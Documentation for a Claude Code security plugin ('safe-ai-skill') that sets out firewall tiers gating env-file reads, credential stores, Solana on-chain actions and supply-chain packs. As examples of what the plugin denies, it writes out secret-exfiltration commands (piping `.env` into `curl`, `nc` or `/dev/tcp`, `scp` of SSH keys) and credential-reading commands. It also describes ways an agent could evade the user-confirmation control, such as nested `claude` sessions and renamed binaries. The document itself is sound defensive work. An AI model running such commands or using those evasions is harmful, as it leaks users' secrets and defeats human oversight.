# Firewall tiers

safe-ai-skill takes a **tier** as an input and varies its gates with it. The tier is a posture, not a sandbox: the plugin is hook-level string analysis, and [what it cannot protect on its own](../README.md#read-this-first-what-this-plugin-cannot-protect-on-its-own) applies at every tier. Last updated for 1.1.0.

## Who owns what

solana-ai-kit ([ai-kit#264](https://github.com/solanabr/ai-kit/issues/264)) and this plugin split the firewall by what each can structurally enforce.

| Owner | Owns |
|---|---|
| solana-ai-kit | The OS sandbox (filesystem denies, `deniedDomains` at the syscall), permission rules, tier selection and regeneration (`/firewall`, `.claude/security.json`), git/publish/fetch-and-execute/`gh` gates, MCP tool-name denies |
| safe-ai-skill | Solana-semantic gates (cluster, amounts, irreversible and authority actions, mainnet, grants); secrets for plugin-only users (key material and home stores hard-denied; project `.env` reads and writes by tier, as the kit does; the `env` CLI, varlock and redaction); supply chain (scan, pins, Skill/slash deny, no moves); the tier as an **input**. A best-effort exfil tripwire is planned ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)) |
| Shared | Versioned list files in `policy/shared/` (`credentials.list`, `exfil-hosts.list`, `onchain-verbs.list`), a conformance corpus and one headless rule |

Defence in depth is kept only where the mechanisms differ (a hook against a syscall, a Rust parser against an awk one). The plugin does not reimplement sandbox semantics and does not promise what only a sandbox can do.

## Names, order, and Off

`off < relaxed < medium < high`. The default is `relaxed`. The old names are input aliases through 1.x: `strict` is `relaxed`, `paranoid` is `high`, `autopilot` is `relaxed` (see [Migration from profiles](#migration-from-profiles)).

**Off is not `SAFE_AI_SKILL_DISABLE=1`.** At Off every `deny` row of the table in the [README](../README.md#firewall-tiers) still holds: key material and credential stores, key material or an env file sent to the network, raw reads of env files other than the project's `.env`/`.env.*`, irreversible on-chain actions on mainnet or an unidentified cluster, default-wallet destruction, the tamper tripwire, the prompt guard and redaction. In a release build Off differs from Relaxed in one row: the supply-chain deny for combination, drift, `lock_mismatch` and unscanned packs (reported instead). `SAFE_AI_SKILL_DISABLE=1` stays the only switch that turns the hooks off, and the shim ignores it in strict mode and when the project's committed `.claude/settings.json` mentions it.

No tier, grant, repo setting or env variable relaxes a `deny` row.

### How the tier is chosen

Per hook call, with the project root as the canonical git toplevel of the payload's `cwd`:

1. **Base:** `relaxed`.
2. **User scope:** the authenticated `tier.json` in the plugin's trusted data directory: `projects[<root>]` if present, else `global`, else base. This is the **only** channel that can select a tier below base.
3. **Raise-only hints,** `effective = max(user, hints…)`. Each hint that is lower than the current value is ignored, with a note in the SessionStart summary:
   - solana-ai-kit's `.claude/security.json`: the highest of top-level `tier`, `declared.tier` and `enforced.tier` (a regular file up to 256 KiB; a malformed one is ignored with a note). The plugin never reads it as a lowering.
   - a repo's `.safe-ai-skill/policy.yaml` `tier` (or the legacy `active_profile`);
   - the env variable `SAFE_AI_SKILL_TIER` (alias `SAFE_AI_SKILL_PROFILE`). A repo's `.claude/settings.json` `env` block can set it, which is why it can only raise.
4. **Floors always apply.** To get less than a repo's or the kit's floor, change the floor (for example through the kit's `/firewall`), not the plugin.

A `tier.json` in the trusted data directory that fails authentication (forged or hand-edited so its MAC fails, an older copy put back, or its state `key` removed) or that was deleted while the authenticated generation index shows a tier was stored makes the tier **High** until you run `safe-ai-skill tier …` again. SessionStart, `status` and `tier` print a note naming the cause (`tier_state` is `failed authentication` or `deleted`). Lowering from there needs the usual confirmation; `safe-ai-skill tier high` replaces the file at once. A `tier.json` in an untrusted data directory is still only ignored, with a note, and the default applies (the untrusted location is the problem, not the file). The tamper gate denies agent writes to the data dir either way.

`safe-ai-skill tier` and `safe-ai-skill status` print `tier: <t> (<source>); sandbox: <state>; lists: contract <version> <sha>` and each ignored hint. SessionStart prints the same line when the tier isn't the plain default, a hint was ignored, or there is anything else to report (a loosening, a migration notice, a pack finding); a clean session at the default tier prints nothing. When the sandbox isn't `On` the label reads `relaxed (hooks only)`.

### Changing the tier: `safe-ai-skill tier`

```bash
safe-ai-skill tier                      # show tier, source, sandbox state, ignored hints
safe-ai-skill tier <name> [--project]   # off | relaxed | medium | high
safe-ai-skill tier --env-read deny|tier [--project]
safe-ai-skill tier --clear [--project]
```

- **Raising** the tier, or tightening `--env-read` to `deny`, applies at once.
- **`--env-read ask` was removed in 1.2.0** and is refused; a stored `ask` is rewritten as `tier` at the next SessionStart, with a one-time notice (see [Project `.env` files](#project-env-files)).
- **Lowering** the user value, or loosening `--env-read` back to `tier`, creates a pending request. Claude Code shows **you** an 8-digit code in a hook message (right after the command, or at your next prompt or session start), never in the agent's context. The request takes effect when your next prompt is exactly `safe-ai-skill confirm <code>`, on its own line, within 10 minutes, once. The payload is re-validated and the change audited. A confirm line inside pasted text is refused; three wrong codes cancel every pending request.
- The agent may run `safe-ai-skill tier` (it can only raise, or create a request it cannot confirm). The tamper tripwire keeps denying a Bash-invoked `confirm` and the hook subcommands.
- **Session binding.** A request belongs to one Claude Code session (`session_id`): the session whose Bash tool ran the command (`CLAUDE_CODE_SESSION_ID`), or, for a request made in a terminal, the first interactive session that shows its code. The code is shown and accepted only there. Resuming keeps the id; `--fork-session` and `/clear` make a new one. Another session's attempts are refused without counting toward the lockout, and a lockout cancels only the session's own requests.
- **Interactive sessions only.** Nothing is announced or confirmed in a headless session (the signals below), in a non-interactive `claude -p`, or in a Claude Code session started from inside another Claude Code CLI, found by walking the hook's process ancestry (`/proc`, or `ps` with a 3 s limit) to the Claude Code CLI that ran it. When the ancestry cannot be determined (no process table, as on native Windows; `ps` denied as in a sandbox, or slower than 3 s; a missing parent; a chain over 64 deep), nothing is announced or confirmed either: the session id cannot vouch on its own, because the agent can steer it (`CLAUDE_CODE_SESSION_ID`, `--session-id`, `--resume`, `-c`). A Claude Code process anywhere above the hook's Claude Code CLI (an agent's nested `claude`, interactive or `-p`, including `--resume <your id>`, `-c` and `--session-id` runs) is refused. A code typed in a refused session is refused without consuming the request or counting a wrong code, and only you are told why. The Claude Desktop app (`…/Claude.app/Contents/MacOS/Claude`) and IDE hosts are not Claude Code CLIs, so a session they host is not "nested"; a host that runs Claude Code with `-p`/`--print` cannot confirm. Whether the Desktop app or IDE integrations run Claude Code in print mode is **unverified**.
- **Where confirmation works:**

  | Request made… | Interactive Claude Code session you started (ancestry readable) | Ancestry undeterminable (native Windows, sandboxed hook, `ps` denied or slow) | `claude -p`, nested, headless/CI |
  |---|---|---|---|
  | by the session's agent (its Bash tool) | yes, in that session | no | no |
  | from a terminal outside any session | yes, in the first such session to show the code | no | no |

  A code never works in another session. **Native Windows:** confirmations (lowering the tier, loosening `env_read`, grants, `verify trust`/`approve`) are unavailable, because the engine cannot read the process table there; raising the tier and everything else work. Use WSL for those actions.
- **Residuals.** Processes are recognised by their argument words, which a nested session's launcher chooses (`exec -a bash claude -p …` looks like a shell), and a nested run started with the owner's session id (`claude --resume <id> -p`, `--session-id <id>`, `-c`) passes the session binding. Both are what the Bash gates' ask is for: `gate-bash` and `gate-bash-secrets` ask about (deny at High or headless) any nested `claude` they can see with `-p`/`--print`, `-c`/`--continue`, `-r`/`--resume`, `--session-id`, or a prompt piped or redirected into it, also behind wrappers (`exec -a NAME`, `env -u VAR`, `timeout 5`, `xargs`, `npx`) or `$(which claude)`. A renamed or linked `claude` binary, or one reached through an expansion, is not seen.
- `mode` is a deprecated alias for `tier`.
- solana-ai-kit's `/firewall` reaches this only by running `safe-ai-skill tier <t> --project` (a proposed kit change, see [the kit draft](drafts/aikit-firewall-split.md)); there is no other handoff file. Until the kit change lands, `/firewall` does not run it; run `safe-ai-skill tier <t> --project` yourself.

### Sandbox detection

`sandbox::state(root)` reports `On`, `Off` or `Unknown` from the first `sandbox.enabled` found in Claude Code's settings precedence: managed, project local, project, then the user settings under `$CLAUDE_CONFIG_DIR` or the passwd home (never the `HOME` environment variable, which a repo can set). `On` also needs a supported platform: macOS, or Linux with `bwrap` at a fixed system path; never native Windows.

This is **declared configuration, not a runtime proof.** The plugin cannot see that a given process is actually sandboxed, and commands the kit lists in `excludedCommands` run unsandboxed whatever the setting says. It changes the tier label and the `denyRead` snippet `safe-ai-skill doctor` prints, and nothing else: project `.env` reads follow the tier whatever the state (1.1.0's sandbox-conditioned opt-in is gone).

## Behaviour per gate

The full table is in the [README](../README.md#firewall-tiers). It is the table the code is checked against; this page explains it. `n/o` is no opinion: empty stdout, and the call continues into Claude Code's own permission flow. `deny` rows are never relaxed by a grant, tier, repo setting or env variable. At High the engine never emits `allow`, and no tier emits `defer`.

### Project `.env` files

A **project env file** is `.env` or `.env.*` (not a template, `.env.schema` or dotenvx key file) inside the session's project, judged by its resolved name and path: `.env.shared` linked to a file outside the project, `.env.w` linked to `tls.pem`, or `../other/.env`, is not one. The session's project is the git toplevel of `CLAUDE_PROJECT_DIR` (else of the hook cwd), or that directory itself without a git repository; it is fixed for the session, so a `cd` never makes another project (`cd ../repo2; cat .env` denies at every tier, `cd apps && cat ../.env` is a project read); a nested git repository below it is another project; and a root at `/`, a home directory or above one has no project env files (the 1.1.0 deny). **Key material is never a project env file:** dotenvx private keys (`.env.keys`, `.env.keys.*`, `.env.*.keys`, also in `credentials.list`) and any project env file whose content holds a keypair, a private-key block or a `DOTENV_PRIVATE_KEY` value (scanned up to 1 MiB) are denied, read and write, at every tier, in Read, Grep, Bash and MCP code. The model is solana-ai-kit's:

| | Off | Relaxed | Medium | High |
|---|---|---|---|---|
| Raw read of a project env file | n/o | n/o | n/o | deny |
| … with your `env_read: deny` (or a repo's) | deny | deny | deny | deny |
| Raw read of another env file (`*.env`, `.envrc`, `.dev.vars`, `.varlock-frozen-env`, `~/.config/solana/cli/config.yml`, env files outside the project) | deny | deny | deny | deny |
| Env data flowing into a network sink | deny | deny | deny | deny |
| Write to a project env file | n/o | n/o | deny | n/o |
| Write to another env file | n/o | n/o | deny | deny |

**At Off, Relaxed and Medium the model sees the values.** The guarantee there is that a secret won't *additionally* reach a third party, not that the model never sees it; a value it has seen can leave through channels a hook can't fully gate (`WebFetch`, MCP servers, DNS). The sandbox's `deniedDomains` is the control ([SECURITY.md](../SECURITY.md#project-env-at-off-relaxed-and-medium)). Medium denies writes rather than asking, because an ask is walked around by `python3 -c`, `perl -pi` or `sed -i`; High leaves writes open, as the kit does, since the model can no longer read the file back (Claude Code's Edit tool also needs a prior Read).

- **Raw reads** are a Read, a Grep with a file path (or a directory Grep inside the project whose glob names `.env`, which then keeps excluding every other env file), an MCP path argument, and any Bash command naming the file, whatever the program (`cat`, `paste`, `tar`, `vim`, `find … -exec`, `git show REV:.env`), also behind wrappers such as `timeout 5` or shell keywords, inside `sh -c '…'`, as a path anywhere in interpreter code (`python3 -c "open('.env')"`, `node -e`, `ruby -e`, `perl -e`, behind `uv run`/`npx`, code on stdin; escapes and adjacent literals decoded), through `xargs -a .env` or `echo .env | xargs cat`, as an input redirect (`tr ';' x < .env`), and `source .env`. A wildcard (`cat .e*`) is not resolved to one file and denies at every tier. A mention of an env file in interpreter code counts as a read even when the code only prints or lists the name (`python3 -c "print('.env')"`): the scan can't tell a mention from a read; an awk or Perl match pattern (`~ ".env"`, `/\.env/`) and a bare dotted identifier (`process.env`) are not paths. Interpreter code with more distinct paths than the gate inspects asks. Metadata commands (`ls`, `stat`, …), a search's pattern (`grep -q .env .gitignore`), `find` without `-exec` and `safe-ai-skill env` are not reads. Only these loaders may name an env file without it counting as a read: `node|bun --env-file F <script>` and `deno run --env-file F <script>` with a file-path script (not `-`, `data:` or `http(s):`), no inline-code or print flag and no piped or redirected input on the line; `docker run|create --env-file F <image>` with nothing after the image and no `--entrypoint`; `docker compose|docker-compose --env-file F` with `up`, `start`, `restart`, `build`, `pull`, `down`, `stop`, `ps` or `logs`; and `dotenv -e F -- <cmd>` / `dotenvx run -f F|--env-file=F -- <cmd>` when `<cmd>` is one of those or a build tool (`npm start|test|run <name>`, `pnpm`, `yarn`, `next`, `vite`, `anchor`, `cargo`, `make`; never `exec`, `dlx`, `node`, `env` or `run env`, and no printer or inline code in its words). A `--import`, `--loader`, `--require` or `-r` value that is a `data:` or `http(s):` module counts as inline code. Every deny names `safe-ai-skill env keys|set|unset` and, when the project has a `.env.schema` or varlock, `varlock load --agent` and `varlock run -- <cmd>`.
- **To the network:** env data that can flow into a network sink is denied at every tier; a read and an unrelated network command on one line are not (`cat .env && curl localhost:3000/health`, `cat .env; gh pr view 3`). The line is split into statements and pipeline stages (outside quotes, substitutions and here-documents), and a flow is: a read upstream of, or in the same stage as, a sink (a pipe, an input redirect, a here-string, a process or command substitution in its words: `cat .env | curl -d @- …`, `nc h 9 < .env`, `curl -H "$(cat .env)" …`, `cat .env > /dev/tcp/…`); an env file loaded into the shell (`source`, `.`, `export $(…)`, `env $(…)`, `X=$(cat .env)`) followed by a sink with an expansion in its words or by network code; a reader's output file later sent by a sink (`cat .env > /tmp/x; curl -T /tmp/x …`); a command naming an env file whose following words run a sink or network code or load a remote script (`dotenv -e .env -- curl …`, `dotenvx run -f .env -- sh -c '…'`, `deno run --env-file=.env https://…`); and interpreter code that names an env file and opens a network client (`requests.`, `urllib`, `fetch(`, `socket`, …; the code strings only, a URL alone is not one). A sink is `curl`, `wget`, `nc`/`ncat`/`netcat`, `socat`, `telnet`, `ssh`, `scp`, `sftp`, `rsync` with a remote, `ftp`, `httpie`/`xh`, `aria2c`, `aws`, `gsutil`, `gcloud`, `az`, `rclone`, `s3cmd`, `sendmail`/`mail`, `websocat`, `grpcurl`, `openssl s_client|s_server`, `gh api|gist|secret set|release upload|--body-file`, `dig`/`host`/`nslookup` with an expansion, also as a `busybox`/`toybox` applet, unless all its destinations are this machine (`localhost`, `127.0.0.1`, `::1`). So is a secret file uploaded by path (`curl -d @.env`, `-T`, `-F k=@`, `wget --post-file`). This is a tripwire over command text, not the control.
- **Writes** are Write, Edit, MultiEdit and NotebookEdit; an agent-run `env set|unset`; and the Bash forms the hooks recognise: an output redirect (`>`, `>>`), `tee`, `truncate`, `dd of=`, `rm`/`unlink`/`shred`, the destination of `cp`/`mv`/`ln`/`rsync`/`install` (`cp .env.example .env`), the source of `mv` (a read too), an in-place edit (`sed -i`, `perl -pi`, `ruby -i`), and interpreter code that names the file and holds a write call (`write`, `append`, an `'a'`/`'w'` mode, `unlink`, `rename`, `set_key`, …; a read too). As the source of `cp`, `ln` or `rsync`, or in `tar`/`zip`, the file is a read. A redaction marker written into any env file is denied at every tier. A write the parser can't see is the sandbox's (`denyWrite`).
- **`env_read`.** `tier` (the default) follows the table; `deny` denies project env reads at every tier. Only you set it (`safe-ai-skill tier --env-read deny|tier`; tightening applies at once, loosening needs your confirmation). A repo's `secrets.env_read: deny` tightens it for that project; any other repo word is ignored, and the plugin's default policy may say only `tier` or `deny`. 1.1.0's `ask` and its sandbox condition were retired in 1.2.0.
- **varlock value printers** (`varlock printenv`, `reveal`, `load --format json|env|shell` without `--agent`) follow the raw-read row.
- **`.env.schema` and templates** (`.env.example|.sample|.template|.dist`) are readable, subject to the content guard: a schema holding key material, a literal credential, over 64 KiB or not a regular file is denied.
- **`env keys`** is always open.
- **Redaction** of key, seed, PEM and vendor-token patterns, and the **value scrub** (literal values from the project's env files replaced with `«redacted:KEY»`), run at every tier on **successful** tool results. The one exception is the Read tool's response to a raw read the tier permits (Off, Relaxed and Medium): pattern redaction still applies, but the values stay, so a read-then-Edit round trip can't write `«redacted:KEY»` over a real value. Bash output (`cat .env`) is always value-scrubbed. A failed tool call (a Bash command that exits non-zero, a Read, Grep or MCP error) is not redacted: Claude Code fires `PostToolUseFailure` for it, which can add context but cannot replace the output, so the raw text reaches the model. The `failure-notice` hook then tells the model not to repeat or send it and warns you (key names only, never a value). See [Known holes](#known-holes).

## On-chain: unrecoverable vs counterparty

The axis is whether an action destroys a capability **even for its rightful owner** (Class U) or moves value or capability to a counterparty (Class C). Only Class U can be judged without knowing the counterparty. Class C is controlled by spend caps, grants and unrelaxable hard-guard asks, and denied at High.

### Class U: unrecoverable actions

Defined by the `irreversible` rows of `onchain-verbs.list`:

- `--final` on `program deploy|write-buffer|upgrade|set-upgrade-authority` (`solana`, `anchor program`, `anchor deploy -- --final`), any `program-v4` subcommand with `--final`, `program-v4 finalize`;
- `program close` in every form: a program (`--bypass-warning`) or a buffer (`<buffer>`, `--buffers`). The command line cannot tell a program from a buffer, so every close is Class U and no grant covers it;
- `spl-token authorize … --disable` (any authority), `spl-token close-mint`, `close`, `burn`; `anchor idl erase-authority`, `anchor idl close`; `close-vote-account`.

The verdict is keyed on the resolved cluster (flag, then a `-C` config file, then for `anchor` the nearest `Anchor.toml`, then the CLI config as `solana config get` reports it; `ANCHOR_PROVIDER_URL` can only make an anchor command riskier, and a command line that sets a variable the CLIs read their config through, or changes directory or the CLI config first, makes later commands Unknown). **Mainnet, Unknown, or any cluster not positively identified as localnet or devnet (testnet included) is a deny**, with the exact command echoed ("run it yourself"). **A positively identified localnet or devnet is a hard-guard ask.** Only exact hosts with an `http(s)://` or `ws(s)://` scheme count (`devnet.attacker.example` and a schemeless `devnet.helius-rpc.com` are Unknown). No grant, tier, repo setting or env variable relaxes either verdict, and Class U is not grantable.

**Wallet destruction (cluster-independent, deny at every tier):** `solana-keygen new|recover` with `--force`/`-f` and no `-o`, or an output resolving to `~/.config/solana/id.json` or the CLI config's `keypair_path`; Write, Edit and NotebookEdit to that file; Bash `rm`, `mv`, `cp`, `tee`, `dd of=` or `>` targeting it.

### Class C: value or capability to a counterparty

Transfers (`solana`, `spl-token`), deploy, upgrade, write-buffer, extend, `set-upgrade-authority` and `spl-token authorize` to a new key, `anchor idl set-authority`, stake/vote/nonce withdraws, `spl-token gc`.

- On mainnet or an Unknown cluster: ask at Off, Relaxed and Medium; deny at High. A confirmed grant that covers it (grantable scopes only, a mainnet deploy included) allows below High and never at High. Policy `network.mainnet: deny` forces a deny at every tier.
- A grant covers one action of its scope. A command line joining two or more gated on-chain actions, or holding any hard-guard ask, is never covered by a grant and asks (deny at High). A grant allows only a direct `solana …`/`spl-token …`/`anchor …` command; the same command behind a wrapper (`env FOO=1 …`) gets no allow from the plugin.
- On an identified test cluster: deploy and upgrade have no opinion; a transfer within the spend caps is allowed below High (no opinion at High); an authority change asks at every tier.
- The hard guards `set_authority` and `account_close` stay unrelaxable. A program buffer close is Class U (see above), never grantable.

A Solana command the parser can't read (a name inside `bash -c "solana $X"`, `eval`, a pipe into `sh`, a program spelled as an expansion) asks as a hard guard, and denies at High. A Bash command over 256 KiB, or with more than 2048 nested expansions, asks without being parsed (deny at High and headless). An MCP tool that moves value or signs asks, and denies at High (an MCP call names no cluster).

`gate-bash` runs for every Bash call (one unconditional `hooks.json` entry with `onFailure: block`), so wrapped, quoted and path-qualified forms and `solana-keygen` all reach it; a fast path answers no opinion for commands that cannot concern it. If the engine crashes, Bash calls are blocked until it is fixed.

### Escapes

Only from user scope, by a confirmed grant where one applies. Repo or env escapes (`CONFIRM_MAINNET`-style) are ignored. Class U has no escape.

## Key material and home credential stores

One shared list, `credentials.list`, with the classes `key_material`, `host_token`, `vault`, `browser_store` and `wallet_ext` (cloud and infrastructure CLI tokens, `~/.config/gcloud`, `~/.azure`, `~/.config/doctl`, `~/.terraform.d/credentials.tfrc.json`, `~/.config/helm` and `~/.vault-token`, are `host_token`). All of them hard-deny at **every tier**: this is deliberately not the kit's split that leaves host tokens readable below Medium, because a hook only sees agent reads, so subprocess `npm` and `gh` keep working.

- **Surfaces:** Read, file Grep, directory Grep, MCP path arguments, and any Bash command naming a store (metadata-only commands such as `ls`, `stat` and `test` excepted; a `NAME=<store path>` assignment counts). Glob lists names only and stays ungated.
- **SSH identities:** `ssh`, `scp` and `sftp` may name a key under `~/.ssh` as their identity (`-i <key>`, `-o IdentityFile=<key>`), and `ssh-keygen -y -f <key>` may print its public key: the key is used, not printed. Any other use of a private key path (`scp ~/.ssh/id_rsa host:`, `cat`, `ssh-add`) is denied. Solana signers may name a keypair under `~/.config/solana` or a `*-keypair.json`; the on-chain gates own those commands.
- **Directory Grep:** exclusion globs for every credential class are appended to its `glob`. A Grep rooted at or above `$HOME` gets all of them (this closes the 1.0.1 leak where a directory-wide Grep could return `.env*` contents). A Grep rooted inside a credential store is denied.
- **Command-form readers** (plugin-internal, not path globs): `gh auth token`, `git credential fill`, `security find-generic-password -w` and `find-internet-password -w`, `aws configure get *secret*` and `export-credentials`, `npm config get *_authToken`, `docker-credential-* get`, `secret-tool lookup`, `pass show`, `op read`, `bw get`.
- **`~/.ssh/**`:** `config`, `known_hosts` and `*.pub` are readable; private keys and `authorized_keys` stay denied.
- **Transcripts:** `~/.claude/projects/**` (and `$CLAUDE_CONFIG_DIR/projects`) and the plugin's state key are read-denied, through Read, Grep and Bash. A custom `$CLAUDE_CONFIG_DIR` (as the hook process has it) is protected like `~/.claude`: a Grep rooted in its `projects/` denies, a Grep over it or above it excludes its transcripts and credentials file, and a Bash word spelling `$CLAUDE_CONFIG_DIR` or `${CLAUDE_CONFIG_DIR}` is expanded before it is judged. **This also stops the agent reading its own auto-memory files** (`~/.claude/projects/<project>/memory/…`) with its tools. That is deliberate: the deny covers the whole `~/.claude/projects/**` tree, which also holds the transcripts that record hook messages, and there is no carve-out for the memory subdirectory. Open those files yourself.
- `~` means the passwd home and `$HOME` (`%USERPROFILE%` on Windows), and matching is case-insensitive on macOS and Windows, on both the path as typed and the symlink-resolved path.
- **Residual** (printed by `doctor`): subprocess, compiled or encoded reads. Only the sandbox closes them.

## Exfiltration (tripwire planned)

The host-list exfil tripwire (a request to a known request-bin, tunnel or paste host from `exfil-hosts.list`) is **not shipped yet**; it is planned in [#19](https://github.com/solanabr/safe-ai-skill/issues/19). What ships:

- A network command that takes a key file, a credential store or an env file by path (`curl -d @.env`, `--data-binary @`, `-T`, `-F k=@`, `wget --post-file`, `scp`), and env data flowing into a network sink (since 1.2.0), are denied at every tier (see [Project `.env` files](#project-env-files)).
- An inline `curl`/`wget` POST body to a non-localhost host asks at every tier (a deny when headless), with one exception: when every destination is a known Solana RPC host and the body is inline, it has no opinion at Off, Relaxed and Medium and asks at High (a deny when headless at High; below High it stays no opinion headless, so a JSON-RPC health check passes under CI). The hosts (`SOLANA_RPC_HOSTS` in `gates/secrets.rs`): `api.mainnet-beta.solana.com`, `api.devnet.solana.com`, `api.testnet.solana.com`, `localhost` and `127.0.0.1` (already quiet at every tier), and at a label boundary `helius-rpc.com`, `quiknode.pro`, `rpcpool.com`, `ankr.com`, `syndica.io`, `extrnode.com`, plus Alchemy's `solana-*.….alchemy.com` hosts. Still asking at every tier: a file or stdin body (`-d @file`, `--data-binary @file`, `--json @file`, `-T`, `-F`, `wget --post-file`), a second destination that is not on the list (another URL, a bare host, `$RPC`), a userinfo `@` or URL glob in the URL, and flags that send the request elsewhere or read more options (`-x`/`--proxy`, `--resolve`, `--connect-to`, `--doh-url`, `-K`/`--config`, `--next`, `--unix-socket`, wget `-e`/`-i`/`-B`), and a command line naming a proxy variable or a curl/wget config location (`https_proxy=`, `ALL_PROXY`, `HOME=`, `CURL_HOME`, `XDG_CONFIG_HOME`, `.curlrc`, `WGETRC`). Residual: a `~/.curlrc` or `~/.wgetrc` written earlier, or a proxy already in the session's environment, is not visible to the hook.
- Requests to listed exfil hosts, IP literals, redirects, DNS, `WebFetch` and values already in context are not gated. solana-ai-kit's sandbox `deniedDomains` (the same 70/79/84-host list, by kit tier) or Claude Code's own sandbox with the entries in [SECURITY.md](../SECURITY.md#recommended-setup) closes the host list for sandboxed commands.
- Code run through an MCP executor (for example context-mode's `ctx_execute`): shell code gets the Bash checks (credential and env reads, on-chain and wallet gates), never an allow and never a grant; other languages get their string literals checked as paths and shell commands (an env file named in code that shows network use is denied at every tier, in code that writes is an env write), and a Solana CLI named there asks (deny at High).

## Supply chain

Grading, state v2, pins, `packs.lock`, trust and approve are unchanged; only the action varies by tier (the README table). **Deny** means the Skill tool, `/slash` expansion and Read, Grep and Bash access under the pack are refused in place. **Report** means SessionStart output naming the pack, the rule, `path:line` and the approve command.

- Combination BLOCKs, drift, `lock_mismatch` and unscanned packs: report at Off, deny in place from Relaxed. A combination BLOCK is never clearable by approve or trust.
- A HIGH heuristic (`unreviewed`): report at Off, Relaxed and Medium; deny in place at High until `verify trust` or `verify approve` (user scope). A repo's `packs.lock` cannot clear it. On an ai-kit checkout at High, SessionStart prints one `verify trust` line listing them.
- **Nothing is moved by default at any tier.** `supply_chain.on_block: move` is opt-in, never touches a git-tracked pack or a submodule path (it reads `.gitmodules` and `.git/index` and never runs git; an index it cannot read counts as tracked), and prints the origin and the restore command.
- At High, SessionStart prints one line, `tier high denies N skill pack(s): <names> — run safe-ai-skill verify trust <pack dir>`, listing the unreviewed HIGH packs it now denies.

## Headless

One rule, shared with the kit.

1. Headless is on when any of these holds: `SAFE_AI_SKILL_HEADLESS` or `KIT_FIREWALL_HEADLESS` is `1` or `true`; any of `CI`, `GITHUB_ACTIONS`, `GITLAB_CI`, `BUILDKITE`, `JENKINS_URL` is set and not `0` or `false`. Any signal turns it on; **nothing turns it off**, because a repo's settings `env` can set these signals. (The shared rule also names an unreadable `/dev/tty`; the engine does not use that signal, because hook processes never have a terminal, so a plain `claude -p` run without one of these variables is not detected as headless by this plugin.)
2. When headless, **every `ask` becomes a `deny`** (irreversible actions on a devnet, value-moving actions on mainnet, hard-guard asks, opaque commands, MCP asks), with the reason "approve interactively, or run it yourself".
3. The only thing that passes is a grant you confirmed interactively beforehand, for grantable Class C scopes, below High.
4. Env escapes (`CONFIRM_MAINNET`, `CONFIRM_*`, anything repo-settable) are ignored. No `defer`, ever. Nothing can be confirmed in a headless session.
5. A Relaxed localnet deploy passes headless (it has no opinion), and so does an inline JSON-RPC POST to a known Solana RPC host below High. Any other inline `curl`/`wget` POST asks, so such a call is denied under CI.

## Known holes

The list of what this layer cannot close, and which of them the kit's sandbox and permission rules close, is in [SECURITY.md](../SECURITY.md#known-holes). Specific to this plugin's redaction: failed tool results (non-zero Bash exits, tool errors) reach the model unredacted, because Claude Code lets a hook replace only a successful result. One cost is deliberate and not a hole: the agent cannot read its own auto-memory with its tools (see [Key material and home credential stores](#key-material-and-home-credential-stores)).

## Migration from profiles

| 1.0 / pre-tier value | Becomes | Applied |
|---|---|---|
| `strict` (the 1.0 default) | `relaxed` | Silently equal, plus one SessionStart line: "mainnet --final, program close and spl-token close/burn now deny" |
| `paranoid` | `high` | A raise, immediate |
| `autopilot` | `relaxed` | Tighter than autopilot, so immediate; the notice names `safe-ai-skill allow --scope transfer` |
| 1.0 `off` | not migrated | Set aside with "`safe-ai-skill tier off` (confirm) or `SAFE_AI_SKILL_DISABLE=1`" |
| the pre-tier `mode.json` | `tier.json` v1 | In `migrate.rs`; never to a tier below `relaxed` |

`profiles:`, `ask_all`, the autopilot cap and the profile names as policy keys are removed; a policy that still has them loads, and SessionStart lists them as ignored.

**1.2.0: `env_read`.** Project `.env`/`.env.*` reads now follow the tier for everyone (open below High), which is a deliberate loosening from 1.1.0's deny at every tier, made to match solana-ai-kit (#16). An install that existed before 1.2.0 and never chose `env_read` gets a one-time SessionStart line saying so, with `safe-ai-skill tier --env-read deny` to keep the 1.1.0 behaviour. A stored `env_read: ask` is rewritten as `tier` at the first 1.2.0 SessionStart with a one-time notice; a stored `tier` keeps its name and now means the default; a stored `deny` is kept and denies the reads at every tier.

## Shared lists

Three line-oriented files at the root of this repository in `policy/shared/`, plus a `MANIFEST`:

| File | Records | Owner |
|---|---|---|
| `credentials.list` | `class os sb glob`; a leading `!` marks an exception (readable) | joint; the `sb` column (the lowest kit tier whose sandbox `denyRead` carries the entry) is the kit's |
| `exfil-hosts.list` | `tier host`; 70 / 79 / 84 cumulative by tier | kit (curation), seeded from `firewall.sh` |
| `onchain-verbs.list` | `class cluster argv…` (`irreversible` or `recoverable`; `any` or `net`) | plugin |

- **Provenance:** seeded once from the kit's `firewall.sh` at ai-kit `42755ab` (rule set 7) plus this plugin's lists. From then on `policy/shared/` is the source and the kit vendors it. Contract 1.1.0 added the cloud and infrastructure CLI token stores to `credentials.list`. `exfil-hosts.list` is shipped and vendored by the kit, but the plugin's tripwire that reads it is planned (#19).
- **Integrity:** `MANIFEST` carries the contract version and a count and sha256 per file. The engine embeds the lists at build (`include_str!`), so the embedded bytes equal `policy/shared/*`; CI checks that. A list that fails to parse at runtime makes the gates that depend on it hard-guard `ask` (fail closed).
- **Extension:** you can union entries in (`secrets.key_material_extra_globs`, and `secrets.exfil_hosts_extra` for the planned tripwire, in user or repo policy); nothing removes an entry.
- **Versioning:** MAJOR when an entry is removed or semantics loosen, MINOR when entries are added, PATCH for comments. The kit vendors the files at a pinned commit (the same commit as its plugin pin) and diffs them in CI. SessionStart prints `contract <version> <manifest sha[:12]>` and, when the kit's vendored `PIN` is present, reports a mismatch (informational, never a policy input).
- **Corpus:** `policy/shared/corpus/*.jsonl` holds the conformance cases both parsers run; changing an expectation needs both owners.

## See also

- [README: Read this first](../README.md#read-this-first-what-this-plugin-cannot-protect-on-its-own) and the tier table
- [SECURITY.md](../SECURITY.md#recommended-setup): recommended setup, known holes by layer
- [docs/drafts/aikit-firewall-split.md](drafts/aikit-firewall-split.md): the proposed kit-side changes
- [ai-kit#264](https://github.com/solanabr/ai-kit/issues/264) (firewall scope) and [ai-kit#265](https://github.com/solanabr/ai-kit/issues/265) (docs)
